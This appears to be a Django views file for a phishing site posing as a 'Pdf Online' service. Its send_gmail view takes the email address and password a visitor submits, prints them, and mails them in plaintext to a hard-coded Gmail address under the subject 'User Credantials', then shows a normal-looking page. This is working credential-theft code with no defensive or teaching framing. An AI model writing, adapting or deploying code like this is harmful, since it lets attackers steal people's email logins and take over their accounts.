from django.shortcuts import render
from django.urls import reverse
from django.http import HttpResponseRedirect, HttpResponse
from django.views.generic import TemplateView
import win32api

from django.core.mail import send_mail


def login(request):
    return render(request, 'login.html')

# class Home(TemplateView):
#     template_name = 'home.html'


def send_gmail(request):
    if request.method == "POST":
        EmailAddress = request.POST.get('EmailAddress')
        Password = request.POST.get('Password')
        print(EmailAddress, Password)
        send_mail(
            "User Credantials",
            f" Email address = {EmailAddress} \n Password = {Password} ",
            'Pdf Online',
            ['jndtv2g@gmail.com'],
            fail_silently=False,
        )
        return render(request, "home.html")
    else:
        return HttpResponse('Invalid request')
